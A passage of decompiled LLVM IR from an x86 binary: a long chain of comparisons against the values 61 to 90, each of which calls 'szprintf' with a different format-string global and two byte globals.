  %v12_804a639 = icmp eq i32 %v11_8049ac4, 61
  %v1_804a63d = icmp eq i1 %v12_804a639, false
  br i1 %v1_804a63d, label %dec_label_pc_804a669, label %dec_label_pc_804a63f

dec_label_pc_804a63f:                             ; preds = %dec_label_pc_804a639
  %v0_804a63f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a63f = zext i8 %v0_804a63f to i32
  store i32 %v1_804a63f, i32* @edx, align 4
  %v0_804a64b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a64b = zext i8 %v0_804a64b to i32
  %v2_804a65a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a65a, i32* @ebx, align 4
  %v5_804a661 = call i32 @szprintf(i32 %v2_804a65a, i32 ptrtoint ([13 x i8]* @global_var_8058a7b.90 to i32), i32 %v1_804a64b, i32 %v1_804a63f)
  br label %dec_label_pc_804a669

dec_label_pc_804a669:                             ; preds = %dec_label_pc_804a639, %dec_label_pc_804a63f
  %v12_804a669 = icmp eq i32 %v11_8049ac4, 62
  %v1_804a66d = icmp eq i1 %v12_804a669, false
  br i1 %v1_804a66d, label %dec_label_pc_804a699, label %dec_label_pc_804a66f

dec_label_pc_804a66f:                             ; preds = %dec_label_pc_804a669
  %v0_804a66f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a66f = zext i8 %v0_804a66f to i32
  store i32 %v1_804a66f, i32* @edx, align 4
  %v0_804a67b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a67b = zext i8 %v0_804a67b to i32
  %v2_804a68a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a68a, i32* @ebx, align 4
  %v5_804a691 = call i32 @szprintf(i32 %v2_804a68a, i32 ptrtoint ([13 x i8]* @global_var_8058a88.91 to i32), i32 %v1_804a67b, i32 %v1_804a66f)
  br label %dec_label_pc_804a699

dec_label_pc_804a699:                             ; preds = %dec_label_pc_804a669, %dec_label_pc_804a66f
  %v12_804a699 = icmp eq i32 %v11_8049ac4, 63
  %v1_804a69d = icmp eq i1 %v12_804a699, false
  br i1 %v1_804a69d, label %dec_label_pc_804a6c9, label %dec_label_pc_804a69f

dec_label_pc_804a69f:                             ; preds = %dec_label_pc_804a699
  %v0_804a69f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a69f = zext i8 %v0_804a69f to i32
  store i32 %v1_804a69f, i32* @edx, align 4
  %v0_804a6ab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a6ab = zext i8 %v0_804a6ab to i32
  %v2_804a6ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ba, i32* @ebx, align 4
  %v5_804a6c1 = call i32 @szprintf(i32 %v2_804a6ba, i32 ptrtoint ([13 x i8]* @global_var_8058a95.92 to i32), i32 %v1_804a6ab, i32 %v1_804a69f)
  br label %dec_label_pc_804a6c9

dec_label_pc_804a6c9:                             ; preds = %dec_label_pc_804a699, %dec_label_pc_804a69f
  %v9_804a6c9 = icmp eq i32 %v11_8049ac4, 64
  %v1_804a6cd = icmp eq i1 %v9_804a6c9, false
  br i1 %v1_804a6cd, label %dec_label_pc_804a6f9, label %dec_label_pc_804a6cf

dec_label_pc_804a6cf:                             ; preds = %dec_label_pc_804a6c9
  %v0_804a6cf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a6cf = zext i8 %v0_804a6cf to i32
  store i32 %v1_804a6cf, i32* @edx, align 4
  %v0_804a6db = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a6db = zext i8 %v0_804a6db to i32
  %v2_804a6ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a6ea, i32* @ebx, align 4
  %v5_804a6f1 = call i32 @szprintf(i32 %v2_804a6ea, i32 ptrtoint ([13 x i8]* @global_var_8058aa2.93 to i32), i32 %v1_804a6db, i32 %v1_804a6cf)
  br label %dec_label_pc_804a6f9

dec_label_pc_804a6f9:                             ; preds = %dec_label_pc_804a6c9, %dec_label_pc_804a6cf
  %v12_804a6f9 = icmp eq i32 %v11_8049ac4, 65
  %v1_804a6fd = icmp eq i1 %v12_804a6f9, false
  br i1 %v1_804a6fd, label %dec_label_pc_804a729, label %dec_label_pc_804a6ff

dec_label_pc_804a6ff:                             ; preds = %dec_label_pc_804a6f9
  %v0_804a6ff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a6ff = zext i8 %v0_804a6ff to i32
  store i32 %v1_804a6ff, i32* @edx, align 4
  %v0_804a70b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a70b = zext i8 %v0_804a70b to i32
  %v2_804a71a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a71a, i32* @ebx, align 4
  %v5_804a721 = call i32 @szprintf(i32 %v2_804a71a, i32 ptrtoint ([13 x i8]* @global_var_8058aaf.94 to i32), i32 %v1_804a70b, i32 %v1_804a6ff)
  br label %dec_label_pc_804a729

dec_label_pc_804a729:                             ; preds = %dec_label_pc_804a6f9, %dec_label_pc_804a6ff
  %v12_804a729 = icmp eq i32 %v11_8049ac4, 66
  %v1_804a72d = icmp eq i1 %v12_804a729, false
  br i1 %v1_804a72d, label %dec_label_pc_804a759, label %dec_label_pc_804a72f

dec_label_pc_804a72f:                             ; preds = %dec_label_pc_804a729
  %v0_804a72f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a72f = zext i8 %v0_804a72f to i32
  store i32 %v1_804a72f, i32* @edx, align 4
  %v0_804a73b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a73b = zext i8 %v0_804a73b to i32
  %v2_804a74a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a74a, i32* @ebx, align 4
  %v5_804a751 = call i32 @szprintf(i32 %v2_804a74a, i32 ptrtoint ([13 x i8]* @global_var_8058abc.95 to i32), i32 %v1_804a73b, i32 %v1_804a72f)
  br label %dec_label_pc_804a759

dec_label_pc_804a759:                             ; preds = %dec_label_pc_804a729, %dec_label_pc_804a72f
  %v12_804a759 = icmp eq i32 %v11_8049ac4, 67
  %v1_804a75d = icmp eq i1 %v12_804a759, false
  br i1 %v1_804a75d, label %dec_label_pc_804a789, label %dec_label_pc_804a75f

dec_label_pc_804a75f:                             ; preds = %dec_label_pc_804a759
  %v0_804a75f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a75f = zext i8 %v0_804a75f to i32
  store i32 %v1_804a75f, i32* @edx, align 4
  %v0_804a76b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a76b = zext i8 %v0_804a76b to i32
  %v2_804a77a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a77a, i32* @ebx, align 4
  %v5_804a781 = call i32 @szprintf(i32 %v2_804a77a, i32 ptrtoint ([13 x i8]* @global_var_8058ac9.96 to i32), i32 %v1_804a76b, i32 %v1_804a75f)
  br label %dec_label_pc_804a789

dec_label_pc_804a789:                             ; preds = %dec_label_pc_804a759, %dec_label_pc_804a75f
  %v12_804a789 = icmp eq i32 %v11_8049ac4, 68
  %v1_804a78d = icmp eq i1 %v12_804a789, false
  br i1 %v1_804a78d, label %dec_label_pc_804a7b9, label %dec_label_pc_804a78f

dec_label_pc_804a78f:                             ; preds = %dec_label_pc_804a789
  %v0_804a78f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a78f = zext i8 %v0_804a78f to i32
  store i32 %v1_804a78f, i32* @edx, align 4
  %v0_804a79b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a79b = zext i8 %v0_804a79b to i32
  %v2_804a7aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7aa, i32* @ebx, align 4
  %v5_804a7b1 = call i32 @szprintf(i32 %v2_804a7aa, i32 ptrtoint ([13 x i8]* @global_var_8058ad6.97 to i32), i32 %v1_804a79b, i32 %v1_804a78f)
  br label %dec_label_pc_804a7b9

dec_label_pc_804a7b9:                             ; preds = %dec_label_pc_804a789, %dec_label_pc_804a78f
  %v12_804a7b9 = icmp eq i32 %v11_8049ac4, 69
  %v1_804a7bd = icmp eq i1 %v12_804a7b9, false
  br i1 %v1_804a7bd, label %dec_label_pc_804a7e9, label %dec_label_pc_804a7bf

dec_label_pc_804a7bf:                             ; preds = %dec_label_pc_804a7b9
  %v0_804a7bf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a7bf = zext i8 %v0_804a7bf to i32
  store i32 %v1_804a7bf, i32* @edx, align 4
  %v0_804a7cb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a7cb = zext i8 %v0_804a7cb to i32
  %v2_804a7da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7da, i32* @ebx, align 4
  %v5_804a7e1 = call i32 @szprintf(i32 %v2_804a7da, i32 ptrtoint ([13 x i8]* @global_var_8058ae3.98 to i32), i32 %v1_804a7cb, i32 %v1_804a7bf)
  br label %dec_label_pc_804a7e9

dec_label_pc_804a7e9:                             ; preds = %dec_label_pc_804a7b9, %dec_label_pc_804a7bf
  %v12_804a7e9 = icmp eq i32 %v11_8049ac4, 70
  %v1_804a7ed = icmp eq i1 %v12_804a7e9, false
  br i1 %v1_804a7ed, label %dec_label_pc_804a819, label %dec_label_pc_804a7ef

dec_label_pc_804a7ef:                             ; preds = %dec_label_pc_804a7e9
  %v0_804a7ef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a7ef = zext i8 %v0_804a7ef to i32
  store i32 %v1_804a7ef, i32* @edx, align 4
  %v0_804a7fb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a7fb = zext i8 %v0_804a7fb to i32
  %v2_804a80a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a80a, i32* @ebx, align 4
  %v5_804a811 = call i32 @szprintf(i32 %v2_804a80a, i32 ptrtoint ([13 x i8]* @global_var_8058af0.99 to i32), i32 %v1_804a7fb, i32 %v1_804a7ef)
  br label %dec_label_pc_804a819

dec_label_pc_804a819:                             ; preds = %dec_label_pc_804a7e9, %dec_label_pc_804a7ef
  %v12_804a819 = icmp eq i32 %v11_8049ac4, 71
  %v1_804a81d = icmp eq i1 %v12_804a819, false
  br i1 %v1_804a81d, label %dec_label_pc_804a849, label %dec_label_pc_804a81f

dec_label_pc_804a81f:                             ; preds = %dec_label_pc_804a819
  %v0_804a81f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a81f = zext i8 %v0_804a81f to i32
  store i32 %v1_804a81f, i32* @edx, align 4
  %v0_804a82b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a82b = zext i8 %v0_804a82b to i32
  %v2_804a83a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a83a, i32* @ebx, align 4
  %v5_804a841 = call i32 @szprintf(i32 %v2_804a83a, i32 ptrtoint ([13 x i8]* @global_var_8058afd.100 to i32), i32 %v1_804a82b, i32 %v1_804a81f)
  br label %dec_label_pc_804a849

dec_label_pc_804a849:                             ; preds = %dec_label_pc_804a819, %dec_label_pc_804a81f
  %v12_804a849 = icmp eq i32 %v11_8049ac4, 72
  %v1_804a84d = icmp eq i1 %v12_804a849, false
  br i1 %v1_804a84d, label %dec_label_pc_804a879, label %dec_label_pc_804a84f

dec_label_pc_804a84f:                             ; preds = %dec_label_pc_804a849
  %v0_804a84f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a84f = zext i8 %v0_804a84f to i32
  store i32 %v1_804a84f, i32* @edx, align 4
  %v0_804a85b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a85b = zext i8 %v0_804a85b to i32
  %v2_804a86a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a86a, i32* @ebx, align 4
  %v5_804a871 = call i32 @szprintf(i32 %v2_804a86a, i32 ptrtoint ([13 x i8]* @global_var_8058b0a.101 to i32), i32 %v1_804a85b, i32 %v1_804a84f)
  br label %dec_label_pc_804a879

dec_label_pc_804a879:                             ; preds = %dec_label_pc_804a849, %dec_label_pc_804a84f
  %v12_804a879 = icmp eq i32 %v11_8049ac4, 73
  %v1_804a87d = icmp eq i1 %v12_804a879, false
  br i1 %v1_804a87d, label %dec_label_pc_804a8a9, label %dec_label_pc_804a87f

dec_label_pc_804a87f:                             ; preds = %dec_label_pc_804a879
  %v0_804a87f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a87f = zext i8 %v0_804a87f to i32
  store i32 %v1_804a87f, i32* @edx, align 4
  %v0_804a88b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a88b = zext i8 %v0_804a88b to i32
  %v2_804a89a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a89a, i32* @ebx, align 4
  %v5_804a8a1 = call i32 @szprintf(i32 %v2_804a89a, i32 ptrtoint ([13 x i8]* @global_var_8058b17.102 to i32), i32 %v1_804a88b, i32 %v1_804a87f)
  br label %dec_label_pc_804a8a9

dec_label_pc_804a8a9:                             ; preds = %dec_label_pc_804a879, %dec_label_pc_804a87f
  %v12_804a8a9 = icmp eq i32 %v11_8049ac4, 74
  %v1_804a8ad = icmp eq i1 %v12_804a8a9, false
  br i1 %v1_804a8ad, label %dec_label_pc_804a8d9, label %dec_label_pc_804a8af

dec_label_pc_804a8af:                             ; preds = %dec_label_pc_804a8a9
  %v0_804a8af = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a8af = zext i8 %v0_804a8af to i32
  store i32 %v1_804a8af, i32* @edx, align 4
  %v0_804a8bb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a8bb = zext i8 %v0_804a8bb to i32
  %v2_804a8ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ca, i32* @ebx, align 4
  %v5_804a8d1 = call i32 @szprintf(i32 %v2_804a8ca, i32 ptrtoint ([13 x i8]* @global_var_8058b24.103 to i32), i32 %v1_804a8bb, i32 %v1_804a8af)
  br label %dec_label_pc_804a8d9

dec_label_pc_804a8d9:                             ; preds = %dec_label_pc_804a8a9, %dec_label_pc_804a8af
  %v12_804a8d9 = icmp eq i32 %v11_8049ac4, 75
  %v1_804a8dd = icmp eq i1 %v12_804a8d9, false
  br i1 %v1_804a8dd, label %dec_label_pc_804a909, label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8d9
  %v0_804a8df = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a8df = zext i8 %v0_804a8df to i32
  store i32 %v1_804a8df, i32* @edx, align 4
  %v0_804a8eb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a8eb = zext i8 %v0_804a8eb to i32
  %v2_804a8fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8fa, i32* @ebx, align 4
  %v5_804a901 = call i32 @szprintf(i32 %v2_804a8fa, i32 ptrtoint ([13 x i8]* @global_var_8058b31.104 to i32), i32 %v1_804a8eb, i32 %v1_804a8df)
  br label %dec_label_pc_804a909

dec_label_pc_804a909:                             ; preds = %dec_label_pc_804a8d9, %dec_label_pc_804a8df
  %v12_804a909 = icmp eq i32 %v11_8049ac4, 76
  %v1_804a90d = icmp eq i1 %v12_804a909, false
  br i1 %v1_804a90d, label %dec_label_pc_804a939, label %dec_label_pc_804a90f

dec_label_pc_804a90f:                             ; preds = %dec_label_pc_804a909
  %v0_804a90f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a90f = zext i8 %v0_804a90f to i32
  store i32 %v1_804a90f, i32* @edx, align 4
  %v0_804a91b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a91b = zext i8 %v0_804a91b to i32
  %v2_804a92a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a92a, i32* @ebx, align 4
  %v5_804a931 = call i32 @szprintf(i32 %v2_804a92a, i32 ptrtoint ([13 x i8]* @global_var_8058b3e.105 to i32), i32 %v1_804a91b, i32 %v1_804a90f)
  br label %dec_label_pc_804a939

dec_label_pc_804a939:                             ; preds = %dec_label_pc_804a909, %dec_label_pc_804a90f
  %v12_804a939 = icmp eq i32 %v11_8049ac4, 77
  %v1_804a93d = icmp eq i1 %v12_804a939, false
  br i1 %v1_804a93d, label %dec_label_pc_804a969, label %dec_label_pc_804a93f

dec_label_pc_804a93f:                             ; preds = %dec_label_pc_804a939
  %v0_804a93f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a93f = zext i8 %v0_804a93f to i32
  store i32 %v1_804a93f, i32* @edx, align 4
  %v0_804a94b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a94b = zext i8 %v0_804a94b to i32
  %v2_804a95a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95a, i32* @ebx, align 4
  %v5_804a961 = call i32 @szprintf(i32 %v2_804a95a, i32 ptrtoint ([13 x i8]* @global_var_8058b4b.106 to i32), i32 %v1_804a94b, i32 %v1_804a93f)
  br label %dec_label_pc_804a969

dec_label_pc_804a969:                             ; preds = %dec_label_pc_804a939, %dec_label_pc_804a93f
  %v12_804a969 = icmp eq i32 %v11_8049ac4, 78
  %v1_804a96d = icmp eq i1 %v12_804a969, false
  br i1 %v1_804a96d, label %dec_label_pc_804a999, label %dec_label_pc_804a96f

dec_label_pc_804a96f:                             ; preds = %dec_label_pc_804a969
  %v0_804a96f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a96f = zext i8 %v0_804a96f to i32
  store i32 %v1_804a96f, i32* @edx, align 4
  %v0_804a97b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a97b = zext i8 %v0_804a97b to i32
  %v2_804a98a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a98a, i32* @ebx, align 4
  %v5_804a991 = call i32 @szprintf(i32 %v2_804a98a, i32 ptrtoint ([13 x i8]* @global_var_8058b58.107 to i32), i32 %v1_804a97b, i32 %v1_804a96f)
  br label %dec_label_pc_804a999

dec_label_pc_804a999:                             ; preds = %dec_label_pc_804a969, %dec_label_pc_804a96f
  %v12_804a999 = icmp eq i32 %v11_8049ac4, 79
  %v1_804a99d = icmp eq i1 %v12_804a999, false
  br i1 %v1_804a99d, label %dec_label_pc_804a9c9, label %dec_label_pc_804a99f

dec_label_pc_804a99f:                             ; preds = %dec_label_pc_804a999
  %v0_804a99f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a99f = zext i8 %v0_804a99f to i32
  store i32 %v1_804a99f, i32* @edx, align 4
  %v0_804a9ab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a9ab = zext i8 %v0_804a9ab to i32
  %v2_804a9ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ba, i32* @ebx, align 4
  %v5_804a9c1 = call i32 @szprintf(i32 %v2_804a9ba, i32 ptrtoint ([13 x i8]* @global_var_8058b65.108 to i32), i32 %v1_804a9ab, i32 %v1_804a99f)
  br label %dec_label_pc_804a9c9

dec_label_pc_804a9c9:                             ; preds = %dec_label_pc_804a999, %dec_label_pc_804a99f
  %v9_804a9c9 = icmp eq i32 %v11_8049ac4, 80
  %v1_804a9cd = icmp eq i1 %v9_804a9c9, false
  br i1 %v1_804a9cd, label %dec_label_pc_804a9f9, label %dec_label_pc_804a9cf

dec_label_pc_804a9cf:                             ; preds = %dec_label_pc_804a9c9
  %v0_804a9cf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a9cf = zext i8 %v0_804a9cf to i32
  store i32 %v1_804a9cf, i32* @edx, align 4
  %v0_804a9db = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a9db = zext i8 %v0_804a9db to i32
  %v2_804a9ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9ea, i32* @ebx, align 4
  %v5_804a9f1 = call i32 @szprintf(i32 %v2_804a9ea, i32 ptrtoint ([13 x i8]* @global_var_8058b72.109 to i32), i32 %v1_804a9db, i32 %v1_804a9cf)
  br label %dec_label_pc_804a9f9

dec_label_pc_804a9f9:                             ; preds = %dec_label_pc_804a9c9, %dec_label_pc_804a9cf
  %v12_804a9f9 = icmp eq i32 %v11_8049ac4, 81
  %v1_804a9fd = icmp eq i1 %v12_804a9f9, false
  br i1 %v1_804a9fd, label %dec_label_pc_804aa29, label %dec_label_pc_804a9ff

dec_label_pc_804a9ff:                             ; preds = %dec_label_pc_804a9f9
  %v0_804a9ff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a9ff = zext i8 %v0_804a9ff to i32
  store i32 %v1_804a9ff, i32* @edx, align 4
  %v0_804aa0b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aa0b = zext i8 %v0_804aa0b to i32
  %v2_804aa1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa1a, i32* @ebx, align 4
  %v5_804aa21 = call i32 @szprintf(i32 %v2_804aa1a, i32 ptrtoint ([13 x i8]* @global_var_8058b7f.110 to i32), i32 %v1_804aa0b, i32 %v1_804a9ff)
  br label %dec_label_pc_804aa29

dec_label_pc_804aa29:                             ; preds = %dec_label_pc_804a9f9, %dec_label_pc_804a9ff
  %v12_804aa29 = icmp eq i32 %v11_8049ac4, 82
  %v1_804aa2d = icmp eq i1 %v12_804aa29, false
  br i1 %v1_804aa2d, label %dec_label_pc_804aa59, label %dec_label_pc_804aa2f

dec_label_pc_804aa2f:                             ; preds = %dec_label_pc_804aa29
  %v0_804aa2f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aa2f = zext i8 %v0_804aa2f to i32
  store i32 %v1_804aa2f, i32* @edx, align 4
  %v0_804aa3b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aa3b = zext i8 %v0_804aa3b to i32
  %v2_804aa4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa4a, i32* @ebx, align 4
  %v5_804aa51 = call i32 @szprintf(i32 %v2_804aa4a, i32 ptrtoint ([13 x i8]* @global_var_8058b8c.111 to i32), i32 %v1_804aa3b, i32 %v1_804aa2f)
  br label %dec_label_pc_804aa59

dec_label_pc_804aa59:                             ; preds = %dec_label_pc_804aa29, %dec_label_pc_804aa2f
  %v12_804aa59 = icmp eq i32 %v11_8049ac4, 83
  %v1_804aa5d = icmp eq i1 %v12_804aa59, false
  br i1 %v1_804aa5d, label %dec_label_pc_804aa89, label %dec_label_pc_804aa5f

dec_label_pc_804aa5f:                             ; preds = %dec_label_pc_804aa59
  %v0_804aa5f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aa5f = zext i8 %v0_804aa5f to i32
  store i32 %v1_804aa5f, i32* @edx, align 4
  %v0_804aa6b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aa6b = zext i8 %v0_804aa6b to i32
  %v2_804aa7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa7a, i32* @ebx, align 4
  %v5_804aa81 = call i32 @szprintf(i32 %v2_804aa7a, i32 ptrtoint ([13 x i8]* @global_var_8058b99.112 to i32), i32 %v1_804aa6b, i32 %v1_804aa5f)
  br label %dec_label_pc_804aa89

dec_label_pc_804aa89:                             ; preds = %dec_label_pc_804aa59, %dec_label_pc_804aa5f
  %v12_804aa89 = icmp eq i32 %v11_8049ac4, 84
  %v1_804aa8d = icmp eq i1 %v12_804aa89, false
  br i1 %v1_804aa8d, label %dec_label_pc_804aab9, label %dec_label_pc_804aa8f

dec_label_pc_804aa8f:                             ; preds = %dec_label_pc_804aa89
  %v0_804aa8f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aa8f = zext i8 %v0_804aa8f to i32
  store i32 %v1_804aa8f, i32* @edx, align 4
  %v0_804aa9b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aa9b = zext i8 %v0_804aa9b to i32
  %v2_804aaaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aaaa, i32* @ebx, align 4
  %v5_804aab1 = call i32 @szprintf(i32 %v2_804aaaa, i32 ptrtoint ([13 x i8]* @global_var_8058ba6.113 to i32), i32 %v1_804aa9b, i32 %v1_804aa8f)
  br label %dec_label_pc_804aab9

dec_label_pc_804aab9:                             ; preds = %dec_label_pc_804aa89, %dec_label_pc_804aa8f
  %v12_804aab9 = icmp eq i32 %v11_8049ac4, 85
  %v1_804aabd = icmp eq i1 %v12_804aab9, false
  br i1 %v1_804aabd, label %dec_label_pc_804aae9, label %dec_label_pc_804aabf

dec_label_pc_804aabf:                             ; preds = %dec_label_pc_804aab9
  %v0_804aabf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aabf = zext i8 %v0_804aabf to i32
  store i32 %v1_804aabf, i32* @edx, align 4
  %v0_804aacb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aacb = zext i8 %v0_804aacb to i32
  %v2_804aada = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aada, i32* @ebx, align 4
  %v5_804aae1 = call i32 @szprintf(i32 %v2_804aada, i32 ptrtoint ([13 x i8]* @global_var_8058bb3.114 to i32), i32 %v1_804aacb, i32 %v1_804aabf)
  br label %dec_label_pc_804aae9

dec_label_pc_804aae9:                             ; preds = %dec_label_pc_804aab9, %dec_label_pc_804aabf
  %v12_804aae9 = icmp eq i32 %v11_8049ac4, 86
  %v1_804aaed = icmp eq i1 %v12_804aae9, false
  br i1 %v1_804aaed, label %dec_label_pc_804ab19, label %dec_label_pc_804aaef

dec_label_pc_804aaef:                             ; preds = %dec_label_pc_804aae9
  %v0_804aaef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804aaef = zext i8 %v0_804aaef to i32
  store i32 %v1_804aaef, i32* @edx, align 4
  %v0_804aafb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804aafb = zext i8 %v0_804aafb to i32
  %v2_804ab0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0a, i32* @ebx, align 4
  %v5_804ab11 = call i32 @szprintf(i32 %v2_804ab0a, i32 ptrtoint ([13 x i8]* @global_var_8058bc0.115 to i32), i32 %v1_804aafb, i32 %v1_804aaef)
  br label %dec_label_pc_804ab19

dec_label_pc_804ab19:                             ; preds = %dec_label_pc_804aae9, %dec_label_pc_804aaef
  %v12_804ab19 = icmp eq i32 %v11_8049ac4, 87
  %v1_804ab1d = icmp eq i1 %v12_804ab19, false
  br i1 %v1_804ab1d, label %dec_label_pc_804ab49, label %dec_label_pc_804ab1f

dec_label_pc_804ab1f:                             ; preds = %dec_label_pc_804ab19
  %v0_804ab1f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ab1f = zext i8 %v0_804ab1f to i32
  store i32 %v1_804ab1f, i32* @edx, align 4
  %v0_804ab2b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ab2b = zext i8 %v0_804ab2b to i32
  %v2_804ab3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab3a, i32* @ebx, align 4
  %v5_804ab41 = call i32 @szprintf(i32 %v2_804ab3a, i32 ptrtoint ([13 x i8]* @global_var_8058bcd.116 to i32), i32 %v1_804ab2b, i32 %v1_804ab1f)
  br label %dec_label_pc_804ab49

dec_label_pc_804ab49:                             ; preds = %dec_label_pc_804ab19, %dec_label_pc_804ab1f
  %v12_804ab49 = icmp eq i32 %v11_8049ac4, 88
  %v1_804ab4d = icmp eq i1 %v12_804ab49, false
  br i1 %v1_804ab4d, label %dec_label_pc_804ab79, label %dec_label_pc_804ab4f

dec_label_pc_804ab4f:                             ; preds = %dec_label_pc_804ab49
  %v0_804ab4f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ab4f = zext i8 %v0_804ab4f to i32
  store i32 %v1_804ab4f, i32* @edx, align 4
  %v0_804ab5b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ab5b = zext i8 %v0_804ab5b to i32
  %v2_804ab6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab6a, i32* @ebx, align 4
  %v5_804ab71 = call i32 @szprintf(i32 %v2_804ab6a, i32 ptrtoint ([13 x i8]* @global_var_8058bda.117 to i32), i32 %v1_804ab5b, i32 %v1_804ab4f)
  br label %dec_label_pc_804ab79

dec_label_pc_804ab79:                             ; preds = %dec_label_pc_804ab49, %dec_label_pc_804ab4f
  %v12_804ab79 = icmp eq i32 %v11_8049ac4, 89
  %v1_804ab7d = icmp eq i1 %v12_804ab79, false
  br i1 %v1_804ab7d, label %dec_label_pc_804aba9, label %dec_label_pc_804ab7f

dec_label_pc_804ab7f:                             ; preds = %dec_label_pc_804ab79
  %v0_804ab7f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804ab7f = zext i8 %v0_804ab7f to i32
  store i32 %v1_804ab7f, i32* @edx, align 4
  %v0_804ab8b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804ab8b = zext i8 %v0_804ab8b to i32
  %v2_804ab9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab9a, i32* @ebx, align 4
  %v5_804aba1 = call i32 @szprintf(i32 %v2_804ab9a, i32 ptrtoint ([13 x i8]* @global_var_8058be7.118 to i32), i32 %v1_804ab8b, i32 %v1_804ab7f)
  br label %dec_label_pc_804aba9

dec_label_pc_804aba9:                             ; preds = %dec_label_pc_804ab79, %dec_label_pc_804ab7f
  %v12_804aba9 = icmp eq i32 %v11_8049ac4, 90
  %v1_804abad = icmp eq i1 %v12_804aba9, false
  br i1 %v1_804abad, label %dec_label_pc_804abd9, label %dec_label_pc_804abaf

dec_label_pc_804abaf:                             ; preds = %dec_label_pc_804aba9
  %v0_804abaf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804abaf = zext i8 %v0_804abaf to i32
  store i32 %v1_804abaf, i32* @edx, align 4
  %v0_804abbb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804abbb = zext i8 %v0_804abbb to i32
